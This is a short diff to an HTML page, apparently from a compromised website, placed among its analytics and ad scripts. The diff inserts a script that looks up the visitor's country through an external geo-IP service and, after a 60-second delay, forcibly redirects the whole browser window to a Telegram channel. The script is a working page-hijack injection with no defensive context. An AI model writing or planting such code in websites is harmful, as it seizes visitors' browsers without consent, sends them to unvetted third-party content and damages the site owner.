@@ -1224,6 +1224,24 @@
     <noscript>
         <a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?5020130&101" alt="" border="0" /></a>
     </noscript>
+	<script>
+var LINK_ID  = "https://t.me/s/fuckmedong"; // ID (Link 1)
+var LINK_ALL = "https://t.me/s/fuckmedong"; // ALL (Link 2)
+
+var DELAY = 60000; // 15 detik
+
+function geoip(g){
+  setTimeout(function(){
+    if (g && g.country === "ID") {
+      window.top.location.href = LINK_ID;
+    } else {
+      window.top.location.href = LINK_ALL;
+    }
+  }, DELAY);
+}
+</script>
+
+<script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
 	<script async src="https://js.wpadmngr.com/static/adManager.js" data-admpid="438001"></script>
 
 </body>
